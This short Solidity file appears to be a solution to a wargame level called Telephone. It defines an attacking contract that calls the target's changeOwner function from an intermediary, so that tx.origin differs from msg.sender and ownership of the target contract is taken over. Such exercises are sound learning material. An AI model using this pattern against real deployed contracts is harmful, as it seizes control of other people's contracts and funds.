pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {
    
    Telephone public target;
    
    constructor(address _targetAddr) public {
        target = Telephone(_targetAddr);
    }
    
    function makeMeOwner() public {
        target.changeOwner(msg.sender);
    }
}
